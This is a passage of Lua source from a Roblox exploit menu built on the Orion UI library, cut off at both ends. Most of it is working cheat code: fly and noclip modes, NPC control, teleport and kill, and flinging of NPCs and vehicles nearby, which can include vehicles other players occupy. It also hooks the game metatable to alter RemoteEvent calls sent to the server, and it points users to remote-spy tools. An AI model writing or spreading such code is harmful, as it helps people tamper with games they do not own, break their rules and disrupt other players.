				if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0 then
					SPEED = 50
				elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0) and SPEED ~= 0 then
					SPEED = 0
				end
				if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 or (CONTROL.Q + CONTROL.E) ~= 0 then
					BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
					lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
				elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and (CONTROL.Q + CONTROL.E) == 0 and SPEED ~= 0 then
					BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
				else
					BV.velocity = Vector3.new(0, 0, 0)
				end
				BG.cframe = workspace.CurrentCamera.CoordinateFrame
			until not FLYING
			CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
			lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
			SPEED = 0
			BG:Destroy()
			BV:Destroy()
			if Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
				Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
			end
		end)
	end
	flyKeyDown = IYMouse.KeyDown:Connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = (vfly and vehicleflyspeed or iyflyspeed)
		elseif KEY:lower() == 's' then
			CONTROL.B = - (vfly and vehicleflyspeed or iyflyspeed)
		elseif KEY:lower() == 'a' then
			CONTROL.L = - (vfly and vehicleflyspeed or iyflyspeed)
		elseif KEY:lower() == 'd' then 
			CONTROL.R = (vfly and vehicleflyspeed or iyflyspeed)
		elseif QEfly and KEY:lower() == 'e' then
			CONTROL.Q = (vfly and vehicleflyspeed or iyflyspeed)*2
		elseif QEfly and KEY:lower() == 'q' then
			CONTROL.E = -(vfly and vehicleflyspeed or iyflyspeed)*2
		end
		pcall(function() workspace.CurrentCamera.CameraType = Enum.CameraType.Track end)
	end)
	flyKeyUp = IYMouse.KeyUp:Connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = 0
		elseif KEY:lower() == 's' then
			CONTROL.B = 0
		elseif KEY:lower() == 'a' then
			CONTROL.L = 0
		elseif KEY:lower() == 'd' then
			CONTROL.R = 0
		elseif KEY:lower() == 'e' then
			CONTROL.Q = 0
		elseif KEY:lower() == 'q' then
			CONTROL.E = 0
		end
	end)
	FLY()
end

function NOFLY()
	FLYING = false
	if flyKeyDown or flyKeyUp then flyKeyDown:Disconnect() flyKeyUp:Disconnect() end
	if Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
		Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
	end
	pcall(function() workspace.CurrentCamera.CameraType = Enum.CameraType.Custom end)
end

LP:AddToggle({
	Name = "Fly",
	Default = false,
	Callback = function(Fly)
		if Fly == true then
               NOFLY()
	wait()
	sFLY()
          else
               Fly = false
               NOFLY()
	end
  end    
})

LP:AddTextbox({
	Name = "Fly Speed",
	Default = "",
	TextDisappear = true,
	Callback = function(Flyspeed)
		iyflyspeed = Flyspeed  
		end	
})

LP:AddToggle({
	Name = "CFrame Fly",
	Default = false,
	Callback = function(cFly)
		if cFly == true then
               plr.Character:FindFirstChildOfClass('Humanoid').PlatformStand = true
	local Head = plr.Character:WaitForChild("Head")
	Head.Anchored = true
	CFloop = game:GetService("RunService").Heartbeat:Connect(function(deltaTime)
		local moveDirection = plr.Character:FindFirstChildOfClass('Humanoid').MoveDirection * (CFspeed * deltaTime)
		local headCFrame = Head.CFrame
		local cameraCFrame = game.Workspace.CurrentCamera.CFrame
		local cameraOffset = headCFrame:ToObjectSpace(cameraCFrame).Position
		cameraCFrame = cameraCFrame * CFrame.new(-cameraOffset.X, -cameraOffset.Y, -cameraOffset.Z + 1)
		local cameraPosition = cameraCFrame.Position
		local headPosition = headCFrame.Position

		local objectSpaceVelocity = CFrame.new(cameraPosition, Vector3.new(headPosition.X, cameraPosition.Y, headPosition.Z)):VectorToObjectSpace(moveDirection)
		Head.CFrame = CFrame.new(headPosition) * (cameraCFrame - cameraPosition) * CFrame.new(objectSpaceVelocity)
	end)
          else
               cFly = false
               if CFloop then
		CFloop:Disconnect()
		plr.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
		local Head = plr.Character:WaitForChild("Head")
		Head.Anchored = false
	end
	end
  end    
})

LP:AddTextbox({
	Name = "CFrame Fly Speed",
	Default = "",
	TextDisappear = true,
	Callback = function(cFlyspeed)
		CFspeed = cFlyspeed
	end	
})

LP:AddToggle({
	Name = "Fly Fling",
	Default = false,
	Callback = function(Fly)
		if Fly == true then
               NOFLY()
	wait()
    for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
    if v:IsA("Part") then

v.CustomPhysicalProperties = PhysicalProperties.new(9e99, 9e99, 9e99, 9e99, 9e99)
end
end
    Noclip()
	sFLY(true)
    local BodyAV = Instance.new("BodyAngularVelocity", game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart"))
BodyAV.AngularVelocity = Vector3.new(0, 2000, 0)
BodyAV.MaxTorque = Vector3.new(0, math.huge, 0)
BodyAV.Name = "FlyFling"
BodyAV.P = 1250
          else
               Fly = false
               NOFLY()
               for _, child in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
		if child.ClassName == "Part" then
			child.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5, 0, 0)
		end
	end
               for i,v in pairs(plr.Character:GetDescendants()) do
                   if v:IsA("BodyAngularVelocity") and v.Name == "FlyFling" then
                      v:Destroy()
                   end
               end
               vNoclip = false
			if Noclipping then
		Noclipping:Disconnect()
	end
	Clip = true
	end
  end    
})

LP:AddTextbox({
	Name = "Fly Fling Speed",
	Default = "",
	TextDisappear = true,
	Callback = function(vFlyspeedsz)
		vehicleflyspeed = vFlyspeedsz
		end	
})

LP:AddToggle({
	Name = "Infinite Jump",
	Default = false,
	Callback = function(Value)
		if Value == true then
               local bool = true
local Player = game:GetService("Players").LocalPlayer
	local Mouse = Player:GetMouse()
	Mouse.KeyDown:connect(function(k)
		if _G.infinjump then
			if k:byte() == 32 then
				Humanoid = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
				Humanoid:ChangeState("Jumping")
				wait(0.1)
				Humanoid:ChangeState("Seated")
			end
end
end)

if bool == 	true then
		_G.infinjump = true
	end
          else
               Value = false
               _G.infinjump = false
	end
  end    
})

LP:AddToggle({
	Name = "Infinite Jump Fly",
	Default = false,
	Callback = function(jumpsFly)
		if jumpsFly == true then
               if flyjump then 
			      flyjump:Disconnect() 
			   end
	flyjump = UserInputService.JumpRequest:Connect(function(Jump)
		game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
	end)
          else
               jumpsFly = false
               if flyjump then 
				  flyjump:Disconnect() 
			   end
	end
  end    
})

LP:AddToggle({
	Name = "Super Fake Character Lag",
	Default = false,
	Callback = function(fakelaglol)
		if fakelaglol == true then
               Lagging = true
	repeat wait()
		plr.Character.HumanoidRootPart.Anchored = false
		wait(.1)
		plr.Character.HumanoidRootPart.Anchored = true
		wait(.1)
	until Lagging == false
          else
               fakelaglol = false
               Lagging = false
			   wait(.3)
	plr.Character.HumanoidRootPart.Anchored = false
	end
  end    
})

LP:AddToggle({
	Name = "Fake Character Lag",
	Default = false,
	Callback = function(fakelaglol)
		if fakelaglol == true then
               Lagging = true
	repeat wait()
		plr.Character.HumanoidRootPart.Anchored = false
		wait(1.5)
		plr.Character.HumanoidRootPart.Anchored = true
		wait(3)
	until Lagging == false
          else
               fakelaglol = false
               Lagging = false
			   wait(.3)
	plr.Character.HumanoidRootPart.Anchored = false
	end
  end    
})

LP:AddToggle({
	Name = "Auto Jump",
	Default = false,
	Callback = function(autojump)
		if autojump == true then
               local Char = plr.Character
	local Human = Char and Char:FindFirstChildWhichIsA("Humanoid")
	local function autoJump()
		if Char and Human then
			local check1 = workspace:FindPartOnRay(Ray.new(Human.RootPart.Position-Vector3.new(0,1.5,0), Human.RootPart.CFrame.lookVector*3), Human.Parent)
			local check2 = workspace:FindPartOnRay(Ray.new(Human.RootPart.Position+Vector3.new(0,1.5,0), Human.RootPart.CFrame.lookVector*3), Human.Parent)
			if check1 or check2 then
				Human.Jump = true
			end
		end
	end
	autoJump()
	HumanModCons.ajLoop = (HumanModCons.ajLoop and HumanModCons.ajLoop:Disconnect() and false) or game:GetService("RunService").RenderStepped:Connect(autoJump)
	HumanModCons.ajCA = (HumanModCons.ajCA and HumanModCons.ajCA:Disconnect() and false) or plr.CharacterAdded:Connect(function(nChar)
		Char, Human = nChar, nChar:WaitForChild("Humanoid")
		autoJump()
		HumanModCons.ajLoop = (HumanModCons.ajLoop and HumanModCons.ajLoop:Disconnect() and false) or game:GetService("RunService").RenderStepped:Connect(autoJump)
	end)
          else
               autojump = false
               HumanModCons.ajLoop = (HumanModCons.ajLoop and HumanModCons.ajLoop:Disconnect() and false) or nil
	HumanModCons.ajCA = (HumanModCons.ajCA and HumanModCons.ajCA:Disconnect() and false) or nil
	end
  end    
})

LP:AddToggle({
	Name = "Auto Obby",
	Default = false,
	Callback = function(autoob)
		if autoob == true then
               AutoObby = true
	plr.Character.Humanoid.Running:Connect(function(speed)
		if speed > 0 and AutoObby == true and plr.Character.Humanoid.FloorMaterial == Enum.Material.Air then
			plr.Character.Humanoid:ChangeState("Jumping")
		end
	end)
          else
               autoob = false
			   AutoObby = false
	end
  end    
})

LP:AddToggle({
	Name = "Edge Jump",
	Default = false,
	Callback = function(edgejump)
		if edgejump == true then
               local Char = plr.Character
	local Human = Char and Char:FindFirstChildWhichIsA("Humanoid")
	-- Full credit to NoelGamer06 @V3rmillion
	local state
	local laststate
	local lastcf
	local function edgejump()
		if Char and Human then
			laststate = state
			state = Human:GetState()
			if laststate ~= state and state == Enum.HumanoidStateType.Freefall and laststate ~= Enum.HumanoidStateType.Jumping then
				Char.HumanoidRootPart.CFrame = lastcf
				Char.HumanoidRootPart.Velocity = Vector3.new(Char.HumanoidRootPart.Velocity.X, Human.JumpPower or Human.JumpHeight, Char.HumanoidRootPart.Velocity.Z)
			end
			lastcf = Char.HumanoidRootPart.CFrame
		end
	end
	edgejump()
	HumanModCons.ejLoop = (HumanModCons.ejLoop and HumanModCons.ejLoop:Disconnect() and false) or game:GetService("RunService").RenderStepped:Connect(edgejump)
	HumanModCons.ejCA = (HumanModCons.ejCA and HumanModCons.ejCA:Disconnect() and false) or plr.CharacterAdded:Connect(function(nChar)
		Char, Human = nChar, nChar:WaitForChild("Humanoid")
		edgejump()
		HumanModCons.ejLoop = (HumanModCons.ejLoop and HumanModCons.ejLoop:Disconnect() and false) or game:GetService("RunService").RenderStepped:Connect(edgejump)
	end)
          else
               edgejump = false
               HumanModCons.ejLoop = (HumanModCons.ejLoop and HumanModCons.ejLoop:Disconnect() and false) or nil
	HumanModCons.ejCA = (HumanModCons.ejCA and HumanModCons.ejCA:Disconnect() and false) or nil
	end
  end    
})

function noSitFunc()
	wait()
	if Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').Sit then
		Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').Sit = false
	end
end

LP:AddToggle({
	Name = "No Sit",
	Default = false,
	Callback = function(nosit)
		if nosit == true then
               if noSit then 
				  noSit:Disconnect() 
				  nositDied:Disconnect() 
			   end
	noSit = Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):GetPropertyChangedSignal("Sit"):Connect(noSitFunc)
	local function nositDiedFunc()
		repeat wait() until plr.Character ~= nil and plr.Character:FindFirstChildOfClass("Humanoid")
		noSit:Disconnect()
		noSit = Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):GetPropertyChangedSignal("Sit"):Connect(noSitFunc)
	end
	nositDied = plr.CharacterAdded:Connect(nositDiedFunc)
          else
               nosit = false
               if noSit then 
				  noSit:Disconnect() 
				  nositDied:Disconnect() 
			   end
	end
  end    
})

local NPCTarget

NPC:AddTextbox({
	Name = "NPC Name",
	Default = "",
	TextDisappear = true,
	Callback = function(NPClol)
		local Target = unpack(GetNPC(NPClol))
		NPCTarget = Target
	end		  
})

NPC:AddToggle({
	Name = "Walk To NPC",
	Default = false,
	Callback = function(Walkn)
        if Walkn == true then
            if plr.Character:FindFirstChildOfClass('Humanoid') and plr.Character:FindFirstChildOfClass('Humanoid').SeatPart then
		plr.Character:FindFirstChildOfClass('Humanoid').Sit = false
		wait(.1)
	end
	    if WalkTo == false then
		WalkTo = true
		repeat wait()
		     plr.Character:FindFirstChild("Humanoid"):MoveTo(getRoot(NPCTarget).Position)
			 until NPCTarget == nil or not getRoot(NPCTarget) or WalkTo == false	
	end
		else
		    Walkn = false
			WalkTo = false
		end		
  end    
})

NPC:AddToggle({
	Name = "Pathfind Walk To NPC",
	Default = false,
	Callback = function(Walkns)
        if Walkns == true then
            WalkTo = false
	local PathService = game:GetService("PathfindingService")
	local hum = plr.Character:FindFirstChildOfClass("Humanoid")
	local path = PathService:CreatePath()
	
	if WalkTo == false then
		WalkTo = true
	repeat wait()
		local success, response = pcall(function()
			path:ComputeAsync(getRoot(plr.Character).Position, getRoot(NPCTarget).Position)
			local waypoints = path:GetWaypoints()
			local distance 
			for waypointIndex, waypoint in pairs(waypoints) do
				local waypointPosition = waypoint.Position
				hum:MoveTo(waypointPosition)
				repeat 
					distance = (waypointPosition - hum.Parent.PrimaryPart.Position).magnitude
					wait()
				until
				distance <= 5
			end	 
		end)
		if not success then
			plr.Character:FindFirstChildOfClass('Humanoid'):MoveTo(getRoot(NPCTarget).Position)
		end
		until NPCTarget == nil or not getRoot(NPCTarget) or WalkTo == false
		end
		else
		    Walkns = false
			WalkTo = false
		end		
  end    
})

NPC:AddToggle({
	Name = "Control NPC",
	Default = false,
	Callback = function(Controlwho)
        if Controlwho == true then
            if Control == false then
       Control = true
       local Char = NPCTarget
       plr.Character = NPCTarget
       game.Workspace.CurrentCamera.CameraSubject = NPCTarget:FindFirstChildWhichIsA("Humanoid")
       Char.Animate.Disabled = true
       wait(0.1)
       Char.Animate.Disabled = false
 end
       if not simRadius then
				SimRad()
			end
		else
		    Controlwho = false
			Control = false
			Control = false
    plr.Character = Workspace[plr.Name]
    game.Workspace.CurrentCamera.CameraSubject = plr.Character
    Workspace[plr.Name].Animate.Disabled = true
       wait(0.1)
       Workspace[plr.Name].Animate.Disabled = false
		end		
  end    
})

NPC:AddButton({
	Name = "unAnchored Parts to NPC",
	Callback = function()
		if sethidden then
			local Forces = {}
			for _,part in pairs(game.Workspace:GetDescendants()) do
				if NPCTarget:FindFirstChild("Head") and part:IsA("BasePart" or "UnionOperation" or "Model") and part.Anchored == false and not part:IsDescendantOf(plr.Character) and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false then
					for i,c in pairs(part:GetChildren()) do
						if c:IsA("BodyPosition") or c:IsA("BodyGyro") then
							c:Destroy()
						end
					end
					local ForceInstance = Instance.new("BodyPosition")
					ForceInstance.Parent = part
					ForceInstance.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
					table.insert(Forces, ForceInstance)
					if not table.find(frozenParts,part) then
						table.insert(frozenParts,part)
					end
				end
			end
			if not simRadius then
				SimRad()
			end
			for i,c in pairs(Forces) do
				c.Position = NPCTarget.Head.Position
			end
		end
	end    
})

NPC:AddButton({
	Name = "Teleport To NPC",
	Callback = function()
      	plr.Character.HumanoidRootPart.CFrame = NPCTarget:GetModelCFrame()
  	end    
})

NPC:AddButton({
	Name = "Vehicle Teleport to NPC",
	Callback = function()
		if NPCTarget ~= nil then
			local seat = plr.Character:FindFirstChildOfClass('Humanoid').SeatPart
			local vehicleModel = seat.Parent
			repeat
				if vehicleModel.ClassName ~= "Model" then
					vehicleModel = vehicleModel.Parent
				end
			until vehicleModel.ClassName == "Model"
			for i,v in pairs(vehicleModel:GetDescendants()) do
				if v:IsA("BasePart") then
				   v:MoveTo(NPCTarget.HumanoidRootPart.Position)
				end   
			end
			for i,v in pairs(vehicleModel.Parent:GetDescendants()) do
				if v:IsA("BasePart") and v.Anchored then
					if v.Anchored == false then
				   v:MoveTo(NPCTarget.HumanoidRootPart.Position)
				   end
				end   
			end
			wait(0.1)
			vehicleModel:MoveTo(NPCTarget.HumanoidRootPart.Position)
	end
	end    
})

NPC:AddButton({
	Name = "Fling Noclipped NPC",
	Callback = function()
flinghh = 1000
local lp = game.Players.LocalPlayer

if type(NPCTarget) == "string" then return end

local oldpos = lp.Character.HumanoidRootPart.CFrame
local oldhh = lp.Character.Humanoid.HipHeight

local carpetAnim = Instance.new("Animation")
carpetAnim.AnimationId = "rbxassetid://282574440"
carpet = lp.Character:FindFirstChildOfClass('Humanoid'):LoadAnimation(carpetAnim)
carpet:Play(.1, 1, 1)

local carpetLoop

local tTorso = NPCTarget:FindFirstChild("Torso") or NPCTarget:FindFirstChild("LowerTorso") or NPCTarget:FindFirstChild("HumanoidRootPart")

spawn(function()
    carpetLoop = game:GetService('RunService').Heartbeat:Connect(function()
	    pcall(function()
	        if tTorso.Velocity.magnitude <= 28 then -- if target uses netless just target their local position
    	        local pos = {x=0, y=0, z=0}
        		pos.x = tTorso.Position.X
        		pos.y = tTorso.Position.Y
        		pos.z = tTorso.Position.Z
        		pos.x = pos.x + tTorso.Velocity.X / 2
        		pos.y = pos.y + tTorso.Velocity.Y / 2
        		pos.z = pos.z + tTorso.Velocity.Z / 2
    		    lp.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(pos.x,pos.y,pos.z))
    		else
    		    lp.Character.HumanoidRootPart.CFrame = tTorso.CFrame
		    end
	    end)
    end)
end)

wait()

lp.Character.Humanoid.HipHeight = flinghh

wait(.5)

carpetLoop:Disconnect()
wait()
lp.Character.Humanoid.Health = 0
wait(game.Players.RespawnTime + .6)
lp.Character.HumanoidRootPart.CFrame = oldpos
  	end    
})

NPC:AddToggle({
	Name = "View NPC",
	Default = false,
	Callback = function(View)
        if View == true then
		viewing = NPCTarget
		game.Workspace.CurrentCamera.CameraSubject = viewing
		else
		    View = false
	game.Workspace.CurrentCamera.CameraSubject = plr.Character
		end		
  end    
})

NPC:AddButton({
	Name = "Notify Information about NPC",
	Callback = function()
      	OrionLib:MakeNotification({
	Name = "Information about NPC:",
	Content = 'Name: '..NPCTarget.Name..' | Health: '..round(NPCTarget:FindFirstChildOfClass('Humanoid').Health, 1)..' | WalkSpeed: '..NPCTarget:FindFirstChildOfClass("Humanoid").WalkSpeed..' | JumpPower: '..NPCTarget:FindFirstChildOfClass("Humanoid").JumpPower,
	Image = "",
	Time = 10
})
  	end    
})

NPC:AddToggle({
	Name = "Stare At NPC",
	Default = false,
	Callback = function(Stareqs)
        if Stareqs == true then
		if stareLoop then
			stareLoop:Disconnect()
		end
		if not plr.Character:FindFirstChild("HumanoidRootPart") and NPCTarget:FindFirstChild("HumanoidRootPart") then return end
		local function stareFunc()
			if plr.Character.PrimaryPart and NPCTarget ~= nil and NPCTarget:FindFirstChild("HumanoidRootPart") then
				local chrPos= plr.Character.PrimaryPart.Position
				local tPos= NPCTarget:FindFirstChild("HumanoidRootPart").Position
				local modTPos=Vector3.new(tPos.X,chrPos.Y,tPos.Z)
				local newCF=CFrame.new(chrPos,modTPos)
				plr.Character:SetPrimaryPartCFrame(newCF)
			elseif not NPCTarget:FindFirstChild(v) then
				stareLoop:Disconnect()
			end
		end

		stareLoop = game:GetService("RunService").RenderStepped:Connect(stareFunc)
		else
		    Stareqs = false
			if stareLoop then
		stareLoop:Disconnect()
	end
		end		
  end    
})

NPC:AddToggle({
	Name = "Fling NPC",
	Default = false,
	Callback = function(Flinglols)
        if Flinglols == true then
            plr.Character.Humanoid.PlatformStand = Platformstand
			Flinging = true
	local Thrust = Instance.new("BodyThrust", plr.Character.HumanoidRootPart)
	Thrust.Force = Vector3.new(100000, 100000, 100000)
	Thrust.Name = "FlingForce"
	repeat
		plr.Character.HumanoidRootPart.CFrame = NPCTarget.HumanoidRootPart.CFrame
		Thrust.Location = getRoot(NPCTarget).Position
		game:GetService('RunService').Heartbeat:Wait()
	until not getRoot(NPCTarget) or Flinging == false
		else
		    Flinglols = false
			Flinging = false
			plr.Character.Humanoid.PlatformStand = false
	for i,v in pairs(plr.Character.HumanoidRootPart:GetChildren()) do
		if v.Name == "FlingForce" and v:IsA("BodyThrust") then
			v:Destroy()
		end
	end
		end		
  end    
})

NPC:AddToggle({
	Name = "PlatformStand Fling",
	Default = false,
	Callback = function(pzFlinglol)
        if pzFlinglol == true then
            Platformstand = true
		else
		    pzFlinglol = false
			Platformstand = false
		end		
  end    
})

NPC:AddButton({
	Name = "ToolHandle Kill NPC",
	Callback = function()
      	local Char = plr.Character
local RS = game:GetService("RunService").RenderStepped
local Tool = Char:FindFirstChildWhichIsA("Tool")
local Handle = Tool and Tool:FindFirstChild("Handle")
if not Tool or not Handle then
   return game.StarterGui:SetCore("SendNotification", {Title = "Warning!", Text = "You need to hold a 'Tool' that does damage on touchinterest. For example Sword or Knife.", Duration = 4,})
end
task.spawn(function()
   while Tool and Char and NPCTarget and Tool.Parent == Char do
           local Human = NPCTarget:FindFirstChildWhichIsA("Humanoid")
           if not Human or Human.Health <= 0 then
                   break
           end
           for i, v1 in ipairs(NPCTarget:GetChildren()) do
                   v1 = ((v1:IsA("BasePart") and firetouchinterest(Handle, v1, 1, (RS.Wait(RS) and nil) or firetouchinterest(Handle, v1, 0)) and nil) or v1) or v1
           end
   end
   game.StarterGui:SetCore("SendNotification", {Title = "Done!", Text = "ToolHandle Kill Stopped. Because npc died or you just unequipped the tool.", Duration = 4,})
end)
  	end    
})

NPC:AddButton({
	Name = "Look At NPC",
	Callback = function()
      	local preMaxZoom = game.Players.LocalPlayer.CameraMaxZoomDistance
	local preMinZoom = game.Players.LocalPlayer.CameraMinZoomDistance
	if plr.CameraMaxZoomDistance ~= 0.5 then
		preMaxZoom = plr.CameraMaxZoomDistance
		preMinZoom = plr.CameraMinZoomDistance
	end
	plr.CameraMaxZoomDistance = 0.5
	plr.CameraMinZoomDistance = 0.5
	wait()
		if NPCTarget and NPCTarget:FindFirstChild('Head') then
			game.Workspace.CurrentCamera.CFrame = CFrame.new(game.Workspace.CurrentCamera.CFrame.p, NPCTarget.Head.CFrame.p)
			wait(0.1)
		end
	plr.CameraMaxZoomDistance = preMaxZoom
	plr.CameraMinZoomDistance = preMinZoom
  	end    
})

local VehicleRemoteName

Vehicle:AddLabel("Vehicle RemoteEvents")

Vehicle:AddTextbox({
	Name = "Vehicle RemoteEvent Name",
	Default = "",
	TextDisappear = true,
	Callback = function(VRMlol)
        OrionLib:MakeNotification({
	Name = "Tutorial",
	Content = "1) You need to write remoteevent name, which was fired of vehicle speed or something other. Use for example remotespy or simplespy to find fired vehicle remoteevent. 2) After finding from remotespy/simplespy, you need to write here remoteevent name. Now it's done, you can change vehicle speed. Enjoy.",
	Image = "rbxassetid://6023426945",
	Time = 25
})
		VehicleRemoteName = VRMlol
	end	  
})

Vehicle:AddTextbox({
	Name = "Vehicle RemoteEvent Speed",
	Default = "",
	TextDisappear = true,
	Callback = function(REVS)
       _G.Speed = tonumber(REVS)
local mt = getrawmetatable(game)
local nc = mt.__namecall
setreadonly(mt, false)
mt.__namecall = function(...)
   local args = {...}
   if getnamecallmethod() == "FireServer" then
      for i,v in pairs({...}) do
          if tostring(v) == VehicleRemoteName then
             args[2] = args[2] * _G.Speed
             args[3] = args[3] + Vector3.new(0,0,(args[3].Z * _G.Speed)-args[3].Z)
             break;
          end
      end
end
   return nc(unpack(args))
end
	end	  
})

Vehicle:AddLabel("Miscellaneous")

Vehicle:AddButton({
	Name = "Information About Vehicle Functions.",
	Callback = function()
        OrionLib:MakeNotification({
	Name = "FE and Non FE",
	Content = "If other first player sitted on seat, then its may not work, it will be Non FE. But if you sitted first, then it can work.",
	Image = "rbxassetid://6023426945",
	Time = 14
})
  	end    
})

Vehicle:AddTextbox({
	Name = "Vehicle-Chassis Speed",
	Default = "",
	TextDisappear = true,
	Callback = function(ChassisS)
       local speed = ChassisS
local met = getrawmetatable(game)
setreadonly(met,false)
local old = met.__newindex
met.__newindex = function(t,k,v)
   if tostring(t) == "#AV" then
       if k == "angularvelocity" or k == "maxTorque" or k == "Speed" then
          return old(t,k,Vector3.new(v.X*speed,v.Y*speed,v.Z*speed))
       end
   end
   return old(t,k,v)
end
	end	  
})

Vehicle:AddTextbox({
	Name = "Vehicle-Chassis SeatSpeed",
	Default = "",
	TextDisappear = true,
	Callback = function(ChassisSs)
       local speed = tonumber(ChassisSs)
       local seat = plr.Character:FindFirstChildOfClass("Humanoid").SeatPart
       local Vehicle = seat.Parent
 
       for i,v in pairs(Vehicle.Parent:GetDescendants()) do
           if v:IsA("VehicleSeat") then
           v.MaxSpeed = speed
end
end
	end	  
})

Vehicle:AddTextbox({
	Name = "Vehicle-Chassis Configurations Speed",
	Default = "",
	TextDisappear = true,
	Callback = function(ChassisSas)
       local speed = tonumber(ChassisSas)
       local seat = plr.Character:FindFirstChildOfClass("Humanoid").SeatPart
       local Vehicle = seat.Parent
 
       for i,v in pairs(Vehicle.Parent:GetDescendants()) do
           if string.match(v.Name, "Config") or string.match(v.Name, "Configurations") and v:IsA("Configuration") then
           for i,b in pairs(v:GetDescendants()) do
               if b.Name == "Speed" or b.Name == "speed" and b:IsA("NumberValue") then
                  b.Value = speed
               end
           end
       end
end
	end	  
})

Vehicle:AddButton({
	Name = "Fling Closest Vehicle",
	Callback = function()
        game.StarterGui:SetCore("SendNotification", {Title = "Warning!", Text = "Use 'No Sit' in LocalPlayer folder for perfect vehicle fling", Duration = 6,})
        
local oldpos = plr.Character.HumanoidRootPart.CFrame

for i,v in pairs(game.Workspace:GetDescendants()) do
    if v:IsA("Seat") or v:IsA("VehicleSeat") then
       for i,b in pairs(v.Parent:GetChildren()) do
           if b:IsA("BasePart") then
       if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - b.Position).Magnitude < 25 then
	wait(0.1)
	Noclip()
    NOFLY()
	wait()
    for _, child in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
		if child.ClassName == "Part" then
			child.CustomPhysicalProperties = PhysicalProperties.new(9e99, 9e99, 9e99, 9e99, 9e99)
		end
	end
    plr.Character.HumanoidRootPart.CFrame = b.CFrame
	sFLY(true)
    local BodyAV = Instance.new("BodyAngularVelocity", game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart"))
BodyAV.AngularVelocity = Vector3.new(0, 2000, 0)
BodyAV.MaxTorque = Vector3.new(0, math.huge, 0)
BodyAV.Name = "VehicleFling"
BodyAV.P = 1250
end
end
end
end
end
wait(2)
NOFLY()
for _, child in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
		if child.ClassName == "Part" then
			child.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5, 0, 0)
		end
	end
               for i,v in pairs(plr.Character:GetDescendants()) do
                   if v:IsA("BodyAngularVelocity") and v.Name == "VehicleFling" then
                      v:Destroy()
                   end
               end
               vNoclip = false
			if Noclipping then
		Noclipping:Disconnect()
	end
	Clip = true
    plr.Character:FindFirstChildOfClass("Humanoid").Health = 0
    wait(game.Players.RespawnTime + .6)
plr.Character.HumanoidRootPart.CFrame = oldpos
  	end    
})

Vehicle:AddButton({
	Name = "Fling Closest Vehicle HipHeight Method",
	Callback = function()
        game.StarterGui:SetCore("SendNotification", {Title = "Warning!", Text = "Use 'No Sit' in LocalPlayer folder for perfect vehicle fling", Duration = 6,})
      	flinghh = 1000
local lp = game.Players.LocalPlayer
local oldpos = lp.Character.HumanoidRootPart.CFrame
local oldhh = lp.Character.Humanoid.HipHeight

local carpetAnim = Instance.new("Animation")
carpetAnim.AnimationId = "rbxassetid://282574440"
carpet = lp.Character:FindFirstChildOfClass('Humanoid'):LoadAnimation(carpetAnim)
carpet:Play(.1, 1, 1)

for i,v in pairs(game.Workspace:GetDescendants()) do
    if v:IsA("Seat") or v:IsA("VehicleSeat") then
       for i,b in pairs(v.Parent:GetChildren()) do
           if b:IsA("BasePart") then
       if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - b.Position).Magnitude < 25 then
       spawn(function()
       for _, child in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
		if child.ClassName == "Part" then
			child.CustomPhysicalProperties = PhysicalProperties.new(9e99, 9e99, 9e99, 9e99, 9e99)
		end
	end
    carpetLoop = game:GetService('RunService').Heartbeat:Connect(function()
	    pcall(function()
	        if b.Velocity.magnitude <= 28 then -- if target uses netless just target their local position
    	        local pos = {x=0, y=0, z=0}
        		pos.x = b.Position.X
        		pos.y = b.Position.Y
        		pos.z = b.Position.Z
        		pos.x = pos.x + b.Velocity.X / 2
